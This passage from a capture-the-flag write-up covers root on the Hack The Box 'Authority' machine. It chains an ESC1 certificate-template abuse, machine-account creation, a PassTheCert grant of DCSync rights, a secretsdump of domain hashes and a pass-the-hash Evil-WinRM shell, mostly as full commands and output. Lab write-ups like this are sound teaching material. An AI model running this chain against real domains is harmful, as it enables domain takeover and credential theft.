    <span class="n">Client</span> <span class="n">Authentication</span>               <span class="p">:</span> <span class="kc">True</span>
    <span class="n">Enrollment</span> <span class="n">Agent</span>                    <span class="p">:</span> <span class="kc">False</span>
    <span class="n">Any</span> <span class="n">Purpose</span>                         <span class="p">:</span> <span class="kc">False</span>
    <span class="n">Enrollee</span> <span class="n">Supplies</span> <span class="n">Subject</span>           <span class="p">:</span> <span class="kc">True</span>
    <span class="n">Certificate</span> <span class="n">Name</span> <span class="n">Flag</span>               <span class="p">:</span> <span class="n">EnrolleeSuppliesSubject</span>
    <span class="n">Enrollment</span> <span class="n">Flag</span>                     <span class="p">:</span> <span class="n">IncludeSymmetricAlgorithms</span>
                                          <span class="n">PublishToDs</span>
                                          <span class="n">AutoEnrollmentCheckUserDsCertificate</span>
    <span class="n">Private</span> <span class="n">Key</span> <span class="n">Flag</span>                    <span class="p">:</span> <span class="n">ExportableKey</span>
    <span class="n">Extended</span> <span class="n">Key</span> <span class="n">Usage</span>                  <span class="p">:</span> <span class="n">Encrypting</span> <span class="n">File</span> <span class="n">System</span>
                                          <span class="n">Secure</span> <span class="n">Email</span>
                                          <span class="n">Client</span> <span class="n">Authentication</span>
                                          <span class="n">Document</span> <span class="n">Signing</span>
                                          <span class="n">IP</span> <span class="n">security</span> <span class="n">IKE</span> <span class="n">intermediate</span>
                                          <span class="n">IP</span> <span class="n">security</span> <span class="n">use</span>
                                          <span class="n">KDC</span> <span class="n">Authentication</span>
    <span class="n">Requires</span> <span class="n">Manager</span> <span class="n">Approval</span>           <span class="p">:</span> <span class="kc">False</span>
    <span class="n">Requires</span> <span class="n">Key</span> <span class="n">Archival</span>               <span class="p">:</span> <span class="kc">False</span>
    <span class="n">Authorized</span> <span class="n">Signatures</span> <span class="n">Required</span>      <span class="p">:</span> <span class="mi">0</span>
    <span class="n">Validity</span> <span class="n">Period</span>                     <span class="p">:</span> <span class="mi">20</span> <span class="n">years</span>
    <span class="n">Renewal</span> <span class="n">Period</span>                      <span class="p">:</span> <span class="mi">6</span> <span class="n">weeks</span>
    <span class="n">Minimum</span> <span class="n">RSA</span> <span class="n">Key</span> <span class="n">Length</span>              <span class="p">:</span> <span class="mi">2048</span>
    <span class="n">Permissions</span>
      <span class="n">Enrollment</span> <span class="n">Permissions</span>
        <span class="n">Enrollment</span> <span class="n">Rights</span>               <span class="p">:</span> <span class="n">AUTHORITY</span><span class="o">.</span><span class="n">HTB</span>\<span class="n">Domain</span> <span class="n">Computers</span>
                                          <span class="n">AUTHORITY</span><span class="o">.</span><span class="n">HTB</span>\<span class="n">Domain</span> <span class="n">Admins</span>
                                          <span class="n">AUTHORITY</span><span class="o">.</span><span class="n">HTB</span>\<span class="n">Enterprise</span> <span class="n">Admins</span>
      <span class="n">Object</span> <span class="n">Control</span> <span class="n">Permissions</span>
        <span class="n">Owner</span>                           <span class="p">:</span> <span class="n">AUTHORITY</span><span class="o">.</span><span class="n">HTB</span>\<span class="n">Administrator</span>
        <span class="n">Write</span> <span class="n">Owner</span> <span class="n">Principals</span>          <span class="p">:</span> <span class="n">AUTHORITY</span><span class="o">.</span><span class="n">HTB</span>\<span class="n">Domain</span> <span class="n">Admins</span>
                                          <span class="n">AUTHORITY</span><span class="o">.</span><span class="n">HTB</span>\<span class="n">Enterprise</span> <span class="n">Admins</span>
                                          <span class="n">AUTHORITY</span><span class="o">.</span><span class="n">HTB</span>\<span class="n">Administrator</span>
        <span class="n">Write</span> <span class="n">Dacl</span> <span class="n">Principals</span>           <span class="p">:</span> <span class="n">AUTHORITY</span><span class="o">.</span><span class="n">HTB</span>\<span class="n">Domain</span> <span class="n">Admins</span>
                                          <span class="n">AUTHORITY</span><span class="o">.</span><span class="n">HTB</span>\<span class="n">Enterprise</span> <span class="n">Admins</span>
                                          <span class="n">AUTHORITY</span><span class="o">.</span><span class="n">HTB</span>\<span class="n">Administrator</span>
        <span class="n">Write</span> <span class="n">Property</span> <span class="n">Principals</span>       <span class="p">:</span> <span class="n">AUTHORITY</span><span class="o">.</span><span class="n">HTB</span>\<span class="n">Domain</span> <span class="n">Admins</span>
                                          <span class="n">AUTHORITY</span><span class="o">.</span><span class="n">HTB</span>\<span class="n">Enterprise</span> <span class="n">Admins</span>
                                          <span class="n">AUTHORITY</span><span class="o">.</span><span class="n">HTB</span>\<span class="n">Administrator</span>
    <span class="p">[</span><span class="err">!</span><span class="p">]</span> <span class="n">Vulnerabilities</span>
      <span class="n">ESC1</span>                              <span class="p">:</span> <span class="s1">'AUTHORITY.HTB</span><span class="se">\\</span><span class="s1">Domain Computers'</span> <span class="n">can</span> <span class="n">enroll</span><span class="p">,</span> <span class="n">enrollee</span> <span class="n">supplies</span> <span class="n">subject</span> <span class="ow">and</span> <span class="n">template</span> <span class="n">allows</span> <span class="n">client</span> <span class="n">authentication</span>
</pre></div>

It's important to highlight the following information:<br/><br/>
<div class="highlight"><pre><span></span><span class="n">CA</span> <span class="n">Name</span>                             <span class="p">:</span> <span class="n">AUTHORITY</span><span class="o">-</span><span class="n">CA</span>
<span class="n">Template</span> <span class="n">Name</span>                       <span class="p">:</span> <span class="n">CorpVPN</span>
<span class="n">DNS</span> <span class="n">Name</span>                            <span class="p">:</span> <span class="n">authority</span><span class="o">.</span><span class="n">authority</span><span class="o">.</span><span class="n">htb</span>
<span class="n">Enrollee</span> <span class="n">Supplies</span> <span class="n">Subject</span>           <span class="p">:</span> <span class="kc">True</span>
<span class="n">Certificate</span> <span class="n">Authorities</span>             <span class="p">:</span> <span class="n">AUTHORITY</span><span class="o">-</span><span class="n">CA</span>
</pre></div>

If the CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag is set in the <code>mspki-certificate-name-flag</code> property, it allows the person requesting a certificate (enrollee) to provide their own alternative Subject Name when creating a certificate signing request. This implies that any user with the permission to request a certificate using this configuration can essentially request a certificate as if they were any user on the network, even one with elevated privileges.<br/><br/>
<div class="highlight"><pre><span></span><span class="p">[</span><span class="err">!</span><span class="p">]</span> <span class="n">Vulnerabilities</span>
      <span class="n">ESC1</span>                              <span class="p">:</span> <span class="s1">'AUTHORITY.HTB</span><span class="se">\\</span><span class="s1">Domain Computers'</span> <span class="n">can</span> <span class="n">enroll</span><span class="p">,</span> <span class="n">enrollee</span> <span class="n">supplies</span> <span class="n">subject</span> <span class="ow">and</span> <span class="n">template</span> <span class="n">allows</span> <span class="n">client</span> <span class="n">authentication</span>
</pre></div>

Members of the <code>Domain Computers</code> group can exploit this vulnerability.<br/><br/>
Since we don't have credentials for <code>Domain Computers</code>, let's check if we can add a computer account to the domain. By default, when you add a computer account, it belongs to the <code>Domain Computers</code> group. To test this, we can use <code>crackmapexec</code>:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">crackmapexec</span> <span class="n">ldap</span> <span class="mf">10.10.11.222</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'svc_ldap'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'lDaP_1n_th3_cle4r!'</span> <span class="o">-</span><span class="n">M</span> <span class="n">maq</span>
<span class="n">SMB</span>         <span class="mf">10.10.11.222</span>    <span class="mi">445</span>    <span class="n">AUTHORITY</span>        <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mf">10.0</span> <span class="n">Build</span> <span class="mi">17763</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">AUTHORITY</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">authority</span><span class="o">.</span><span class="n">htb</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
<span class="n">LDAPS</span>       <span class="mf">10.10.11.222</span>    <span class="mi">636</span>    <span class="n">AUTHORITY</span>        <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">authority</span><span class="o">.</span><span class="n">htb</span>\<span class="n">svc_ldap</span><span class="p">:</span><span class="n">lDaP_1n_th3_cle4r</span><span class="err">!</span> 
<span class="n">MAQ</span>         <span class="mf">10.10.11.222</span>    <span class="mi">389</span>    <span class="n">AUTHORITY</span>        <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Getting</span> <span class="n">the</span> <span class="n">MachineAccountQuota</span>
<span class="n">MAQ</span>         <span class="mf">10.10.11.222</span>    <span class="mi">389</span>    <span class="n">AUTHORITY</span>        <span class="n">MachineAccountQuota</span><span class="p">:</span> <span class="mi">10</span>
</pre></div>

The <code>MachineAccountQuota</code> parameter is designed to control the maximum number of machine accounts (computer accounts) that can be created within a specific domain. Additionally, since the user possesses the default <code>SeMachineAccountPrivilege</code> privilege, it has the ability to add machine accounts to the domain.<br/><br/>
To add machine accounts to the domain, we can use the <code>impacket-addcomputer</code> tool from the <a href="https://github.com/fortra/impacket">Impacket</a> suite.<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">impacket</span><span class="o">-</span><span class="n">addcomputer</span> <span class="s1">'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!'</span> <span class="o">-</span><span class="n">computer</span><span class="o">-</span><span class="n">name</span> <span class="s1">'elswixpc'</span> <span class="o">-</span><span class="n">computer</span><span class="o">-</span><span class="k">pass</span> <span class="s1">'Password123!'</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">10.10.11.222</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.11.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="mi">2023</span> <span class="n">Fortra</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Successfully</span> <span class="n">added</span> <span class="n">machine</span> <span class="n">account</span> <span class="n">elswixpc</span><span class="err">$</span> <span class="k">with</span> <span class="n">password</span> <span class="n">Password123</span><span class="err">!</span><span class="o">.</span>
</pre></div>

Since we can request a certificate as any user, we will request a ticket specifying the <code>administrator</code> UPN (User Principal Name). Typically, the UPN has the following structure: <code>user@domain.local</code>. In this case, it would be <code>administrator@authority.htb</code>.<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">certipy</span><span class="o">-</span><span class="n">ad</span> <span class="n">req</span> <span class="o">-</span><span class="n">ca</span> <span class="s1">'AUTHORITY-CA'</span> <span class="o">-</span><span class="n">template</span> <span class="s1">'CorpVPN'</span> <span class="o">-</span><span class="n">username</span> <span class="s1">'elswixpc$@authority.htb'</span> <span class="o">-</span><span class="n">password</span> <span class="s1">'Password123!'</span> <span class="o">-</span><span class="n">dns</span> <span class="n">authority</span><span class="o">.</span><span class="n">authority</span><span class="o">.</span><span class="n">htb</span> <span class="o">-</span><span class="n">target</span><span class="o">-</span><span class="n">ip</span> <span class="mf">10.10.11.222</span> <span class="o">-</span><span class="n">upn</span> <span class="s1">'administrator@authority.htb'</span> <span class="o">-</span><span class="n">debug</span>
<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.7.0</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>

<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">resolve</span> <span class="s1">'AUTHORITY.HTB'</span> <span class="n">at</span> <span class="s1">'192.168.1.1'</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Generating</span> <span class="n">RSA</span> <span class="n">key</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Requesting</span> <span class="n">certificate</span> <span class="n">via</span> <span class="n">RPC</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">connect</span> <span class="n">to</span> <span class="n">endpoint</span><span class="p">:</span> <span class="n">ncacn_np</span><span class="p">:</span><span class="mf">10.10.11.222</span><span class="p">[</span>\<span class="n">pipe</span>\<span class="n">cert</span><span class="p">]</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Connected</span> <span class="n">to</span> <span class="n">endpoint</span><span class="p">:</span> <span class="n">ncacn_np</span><span class="p">:</span><span class="mf">10.10.11.222</span><span class="p">[</span>\<span class="n">pipe</span>\<span class="n">cert</span><span class="p">]</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Successfully</span> <span class="n">requested</span> <span class="n">certificate</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Request</span> <span class="n">ID</span> <span class="ow">is</span> <span class="mi">5</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="n">certificate</span> <span class="k">with</span> <span class="n">multiple</span> <span class="n">identifications</span>
    <span class="n">UPN</span><span class="p">:</span> <span class="s1">'administrator@authority.htb'</span>
    <span class="n">DNS</span> <span class="n">Host</span> <span class="n">Name</span><span class="p">:</span> <span class="s1">'authority.authority.htb'</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Certificate</span> <span class="n">has</span> <span class="n">no</span> <span class="nb">object</span> <span class="n">SID</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Saved</span> <span class="n">certificate</span> <span class="ow">and</span> <span class="n">private</span> <span class="n">key</span> <span class="n">to</span> <span class="s1">'administrator_authority.pfx'</span>
</pre></div>

With the certificate stored in the <code>administrator_authority.pfx</code>, we should be able to request a <code>.ccache</code> file and obtain the <code>NT Hash</code> for the administrator user.<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">certipy</span><span class="o">-</span><span class="n">ad</span> <span class="n">auth</span> <span class="o">-</span><span class="n">pfx</span> <span class="n">administrator_authority</span><span class="o">.</span><span class="n">pfx</span>
<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.7.0</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Found</span> <span class="n">multiple</span> <span class="n">identifications</span> <span class="ow">in</span> <span class="n">certificate</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Please</span> <span class="n">select</span> <span class="n">one</span><span class="p">:</span>
    <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="n">UPN</span><span class="p">:</span> <span class="s1">'administrator@authority.htb'</span>
    <span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="n">DNS</span> <span class="n">Host</span> <span class="n">Name</span><span class="p">:</span> <span class="s1">'authority.authority.htb'</span>
<span class="o">&gt;</span> <span class="mi">0</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">principal</span><span class="p">:</span> <span class="n">administrator</span><span class="nd">@authority</span><span class="o">.</span><span class="n">htb</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">get</span> <span class="n">TGT</span><span class="o">...</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Got</span> <span class="n">error</span> <span class="k">while</span> <span class="n">trying</span> <span class="n">to</span> <span class="n">request</span> <span class="n">TGT</span><span class="p">:</span> <span class="n">Kerberos</span> <span class="n">SessionError</span><span class="p">:</span> <span class="n">KDC_ERR_PADATA_TYPE_NOSUPP</span><span class="p">(</span><span class="n">KDC</span> <span class="n">has</span> <span class="n">no</span> <span class="n">support</span> <span class="k">for</span> <span class="n">padata</span> <span class="nb">type</span><span class="p">)</span>
</pre></div>

When attempting to request a TGT using the <code>PFX</code> file, it returns the <code>KDC_ERR_PADATA_TYPE_NOSUPP</code> error. This error indicates that the KDC is not configured for Kerberos authentication.<br/><br/>
There are some tricks to bypass this error, and one way is by using the <a href="https://github.com/AlmondOffSec/PassTheCert">PassTheCert</a> tool.<br/><br/>
<em>Sometimes, Domain Controllers do not support PKINIT. This can be because their certificates do not have the <code>Smart Card Logon EKU</code>. However, several protocols, including LDAP, support Schannel, thus authentication through TLS. We created a small Proof-of-Concept tool that allows authenticating against an LDAP/S server with a certificate to perform different attack actions.</em><br/><br/>
Firstly, we need to export the <code>CRT</code> and the <code>KEY</code> from the <code>PFX</code> file. This can be done using <code>certipy</code>:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">certipy</span><span class="o">-</span><span class="n">ad</span> <span class="n">cert</span> <span class="o">-</span><span class="n">pfx</span> <span class="n">administrator_authority</span><span class="o">.</span><span class="n">pfx</span> <span class="o">-</span><span class="n">nokey</span> <span class="o">-</span><span class="n">out</span> <span class="n">administrator</span><span class="o">.</span><span class="n">crt</span>
<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.7.0</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Writing</span> <span class="n">certificate</span> <span class="ow">and</span>  <span class="n">to</span> <span class="s1">'administrator.crt'</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">certipy</span><span class="o">-</span><span class="n">ad</span> <span class="n">cert</span> <span class="o">-</span><span class="n">pfx</span> <span class="n">administrator_authority</span><span class="o">.</span><span class="n">pfx</span> <span class="o">-</span><span class="n">nocert</span> <span class="o">-</span><span class="n">out</span> <span class="n">administrator</span><span class="o">.</span><span class="n">key</span>
<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.7.0</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Writing</span> <span class="n">private</span> <span class="n">key</span> <span class="n">to</span> <span class="s1">'administrator.key'</span>
</pre></div>

There are numerous options to exploit using <code>PassTheCert</code>. In this case, I will use the method that elevates a user for DCSync. This allows us to grant <code>DCSync</code> privileges to <code>svc_ldap</code> (the user for which we have credentials) and execute a DCSync attack to retrieve the NT Hash of the administrator user or any other desired user.<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">PassTheCert</span><span class="o">/</span><span class="n">Python</span><span class="o">/</span><span class="n">passthecert</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">action</span> <span class="n">modify_user</span> <span class="o">-</span><span class="n">crt</span> <span class="n">administrator</span><span class="o">.</span><span class="n">crt</span> <span class="o">-</span><span class="n">key</span> <span class="n">administrator</span><span class="o">.</span><span class="n">key</span> <span class="o">-</span><span class="n">domain</span> <span class="n">authority</span><span class="o">.</span><span class="n">htb</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">10.10.11.222</span> <span class="o">-</span><span class="n">target</span> <span class="s1">'svc_ldap'</span> <span class="o">-</span><span class="n">elevate</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.11.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="mi">2023</span> <span class="n">Fortra</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Granted</span> <span class="n">user</span> <span class="s1">'svc_ldap'</span> <span class="n">DCSYNC</span> <span class="n">rights</span><span class="err">!</span>
</pre></div>

Now, using the <code>impacket-secretsdump</code> tool from the <a href="https://github.com/fortra/impacket">Impacket</a> suite, we can execute a <code>DCSync</code> attack.<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">impacket</span><span class="o">-</span><span class="n">secretsdump</span> <span class="s1">'authority.htb/svc_ldap@10.10.11.222'</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.11.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="mi">2023</span> <span class="n">Fortra</span>

<span class="n">Password</span><span class="p">:</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">RemoteOperations</span> <span class="n">failed</span><span class="p">:</span> <span class="n">DCERPC</span> <span class="n">Runtime</span> <span class="n">Error</span><span class="p">:</span> <span class="n">code</span><span class="p">:</span> <span class="mh">0x5</span> <span class="o">-</span> <span class="n">rpc_s_access_denied</span> 
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Dumping</span> <span class="n">Domain</span> <span class="n">Credentials</span> <span class="p">(</span><span class="n">domain</span>\<span class="n">uid</span><span class="p">:</span><span class="n">rid</span><span class="p">:</span><span class="n">lmhash</span><span class="p">:</span><span class="n">nthash</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">the</span> <span class="n">DRSUAPI</span> <span class="n">method</span> <span class="n">to</span> <span class="n">get</span> <span class="n">NTDS</span><span class="o">.</span><span class="n">DIT</span> <span class="n">secrets</span>
<span class="n">Administrator</span><span class="p">:</span><span class="mi">500</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">6961</span><span class="n">f422924da90a6928197429eea4ed</span><span class="p">:::</span>
<span class="n">Guest</span><span class="p">:</span><span class="mi">501</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">31</span><span class="n">d6cfe0d16ae931b73c59d7e0c089c0</span><span class="p">:::</span>
<span class="n">krbtgt</span><span class="p">:</span><span class="mi">502</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">bd6bd7fcab60ba569e3ed57c7c322908</span><span class="p">:::</span>
<span class="n">svc_ldap</span><span class="p">:</span><span class="mi">1601</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">6839</span><span class="n">f4ed6c7e142fed7988a6c5d0c5f1</span><span class="p">:::</span>
<span class="n">AUTHORITY</span><span class="err">$</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">ac248ae00b5d3e2ea04a2ca4e4b19ae2</span><span class="p">:::</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Kerberos</span> <span class="n">keys</span> <span class="n">grabbed</span>
<span class="n">Administrator</span><span class="p">:</span><span class="n">aes256</span><span class="o">-</span><span class="n">cts</span><span class="o">-</span><span class="n">hmac</span><span class="o">-</span><span class="n">sha1</span><span class="o">-</span><span class="mi">96</span><span class="p">:</span><span class="mi">72</span><span class="n">c97be1f2c57ba5a51af2ef187969af4cf23b61b6dc444f93dd9cd1d5502a81</span>
<span class="n">Administrator</span><span class="p">:</span><span class="n">aes128</span><span class="o">-</span><span class="n">cts</span><span class="o">-</span><span class="n">hmac</span><span class="o">-</span><span class="n">sha1</span><span class="o">-</span><span class="mi">96</span><span class="p">:</span><span class="n">b5fb2fa35f3291a1477ca5728325029f</span>
<span class="n">Administrator</span><span class="p">:</span><span class="n">des</span><span class="o">-</span><span class="n">cbc</span><span class="o">-</span><span class="n">md5</span><span class="p">:</span><span class="mi">8</span><span class="n">ad3d50efed66b16</span>
<span class="n">krbtgt</span><span class="p">:</span><span class="n">aes256</span><span class="o">-</span><span class="n">cts</span><span class="o">-</span><span class="n">hmac</span><span class="o">-</span><span class="n">sha1</span><span class="o">-</span><span class="mi">96</span><span class="p">:</span><span class="mi">1</span><span class="n">be737545ac8663be33d970cbd7bebba2ecfc5fa4fdfef3d136f148f90bd67cb</span>
<span class="n">krbtgt</span><span class="p">:</span><span class="n">aes128</span><span class="o">-</span><span class="n">cts</span><span class="o">-</span><span class="n">hmac</span><span class="o">-</span><span class="n">sha1</span><span class="o">-</span><span class="mi">96</span><span class="p">:</span><span class="n">d2acc08a1029f6685f5a92329c9f3161</span>
<span class="n">krbtgt</span><span class="p">:</span><span class="n">des</span><span class="o">-</span><span class="n">cbc</span><span class="o">-</span><span class="n">md5</span><span class="p">:</span><span class="n">a1457c268ca11919</span>
<span class="n">svc_ldap</span><span class="p">:</span><span class="n">aes256</span><span class="o">-</span><span class="n">cts</span><span class="o">-</span><span class="n">hmac</span><span class="o">-</span><span class="n">sha1</span><span class="o">-</span><span class="mi">96</span><span class="p">:</span><span class="mi">3773526</span><span class="n">dd267f73ee80d3df0af96202544bd2593459fdccb4452eee7c70f3b8a</span>
<span class="n">svc_ldap</span><span class="p">:</span><span class="n">aes128</span><span class="o">-</span><span class="n">cts</span><span class="o">-</span><span class="n">hmac</span><span class="o">-</span><span class="n">sha1</span><span class="o">-</span><span class="mi">96</span><span class="p">:</span><span class="mi">08</span><span class="n">da69b159e5209b9635961c6c587a96</span>
<span class="n">svc_ldap</span><span class="p">:</span><span class="n">des</span><span class="o">-</span><span class="n">cbc</span><span class="o">-</span><span class="n">md5</span><span class="p">:</span><span class="mi">01</span><span class="n">a8984920866862</span>
<span class="n">AUTHORITY</span><span class="err">$</span><span class="p">:</span><span class="n">aes256</span><span class="o">-</span><span class="n">cts</span><span class="o">-</span><span class="n">hmac</span><span class="o">-</span><span class="n">sha1</span><span class="o">-</span><span class="mi">96</span><span class="p">:</span><span class="mi">3491767984</span><span class="n">c8fd01a12f655cc6571168c9517f3ef9e4329c665bccbbc483bbab</span>
<span class="n">AUTHORITY</span><span class="err">$</span><span class="p">:</span><span class="n">aes128</span><span class="o">-</span><span class="n">cts</span><span class="o">-</span><span class="n">hmac</span><span class="o">-</span><span class="n">sha1</span><span class="o">-</span><span class="mi">96</span><span class="p">:</span><span class="n">e76001d8993cffabfb5abb35681aa569</span>
<span class="n">AUTHORITY</span><span class="err">$</span><span class="p">:</span><span class="n">des</span><span class="o">-</span><span class="n">cbc</span><span class="o">-</span><span class="n">md5</span><span class="p">:</span><span class="mf">989e105262</span><span class="n">ecec83</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Cleaning</span> <span class="n">up</span><span class="o">...</span>
</pre></div>

Now, by copying the NT hash of the administrator user, we can use it as an authentication method (PassTheHash):<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10.11.222</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'administrator'</span> <span class="o">-</span><span class="n">H</span> <span class="s1">'6961f422924da90a6928197429eea4ed'</span>
<span class="n">SMB</span>         <span class="mf">10.10.11.222</span>    <span class="mi">445</span>    <span class="n">AUTHORITY</span>        <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mf">10.0</span> <span class="n">Build</span> <span class="mi">17763</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">AUTHORITY</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">authority</span><span class="o">.</span><span class="n">htb</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
<span class="n">SMB</span>         <span class="mf">10.10.11.222</span>    <span class="mi">445</span>    <span class="n">AUTHORITY</span>        <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">authority</span><span class="o">.</span><span class="n">htb</span>\<span class="n">administrator</span><span class="p">:</span><span class="mi">6961</span><span class="n">f422924da90a6928197429eea4ed</span> <span class="p">(</span><span class="n">Pwn3d</span><span class="err">!</span><span class="p">)</span>
</pre></div>

We can obtain a shell as the <code>administrator</code> user using <code>Evil-WinRM</code>:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">evil</span><span class="o">-</span><span class="n">winrm</span> <span class="o">-</span><span class="n">i</span> <span class="mf">10.10.11.222</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'Administrator'</span> <span class="o">-</span><span class="n">H</span> <span class="s1">'6961f422924da90a6928197429eea4ed'</span>

<span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span> <span class="n">shell</span> <span class="n">v3</span><span class="mf">.5</span>

<span class="n">Info</span><span class="p">:</span> <span class="n">Establishing</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">remote</span> <span class="n">endpoint</span>
<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Documents</span><span class="o">&gt;</span> <span class="n">whoami</span>
<span class="n">htb</span>\<span class="n">administrator</span>
<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Documents</span><span class="o">&gt;</span> <span class="n">cat</span> <span class="o">..</span>\<span class="n">Desktop</span>\<span class="n">root</span><span class="o">.</span><span class="n">txt</span>
<span class="n">a35ec</span><span class="o">**********************</span><span class="n">f650a</span>
